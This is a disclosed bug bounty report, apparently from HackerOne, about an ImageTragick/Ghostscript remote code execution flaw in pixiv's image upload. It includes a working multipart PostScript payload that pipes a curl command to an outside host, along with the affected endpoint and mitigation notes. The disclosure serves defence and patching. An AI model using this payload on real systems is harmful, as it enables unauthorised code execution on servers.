---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2021-03-16
submitted: 2018-08-29T10:23:03.778Z
bounty_usd: 2000
votes: 44
cve: []
program: "[[programs/pixiv|pixiv]]"
reporter: "chaosbolt"
source: "https://hackerone.com/reports/402362"
title: "RCE due to ImageTragick v2"
---
# RCE due to ImageTragick v2

> **Severity:** Critical | **Bounty:** 2,000 USD | **Votes:** 44 | **Program:** pixiv | **Disclosed:** 2021-03-16

- Report: [https://hackerone.com/reports/402362](https://hackerone.com/reports/402362)
- CWE: Code Injection
- Submitted: 2018-08-29T10:23:03.778Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello Pixiv team! Your Image processing process suffering from ImageTragick v2. Issue is caused by ghostscript RCE findnings.

How to reproduce:
PATCH /design
Host: manage.booth.pm

send following image:
```
------WebKitFormBoundaryXX05yrKS4g8d9CWh
Content-Disposition: form-data; name="shop[header]"; filename="imagetragick.jpeg"
Content-Type: image/jpeg

%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%curl https://avtohanter.ru/qwetest) currentdevice putdeviceprops
------WebKitFormBoundaryXX05yrKS4g8d9CWh--
```

How to fix:
Update ImageMagick, should help

## Impact

Remote Code Execution

## Timeline

- **Report Filed**
- **2018-08-29** @chaosbolt: Screen
- **2018-08-29** @kobo: Thanks again for your submission.
We are investigating this report and will keep you updated when we have additional information.
- **2018-08-29** @chaosbolt: Actually I am not 100% sure if updating ImageMagick will help, if I find anything on how to properly fix I will let you know. 

Btw helpful link: http://openwall.com/lists/oss-security/2018/08/21/2
- **Report Triaged**
- **2018-08-29** @chaosbolt: Yes, this particular one is fixed.
- **2018-08-30** @chaosbolt: I dig into this and found out that PS,PS2,PS3,EPS,PDF,XPS handlers are parsing ghostscript, disabling every one of them is required to properly fix the vulnerability. Maybe this will help you anyhow in future to identifiy this on other servers.
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
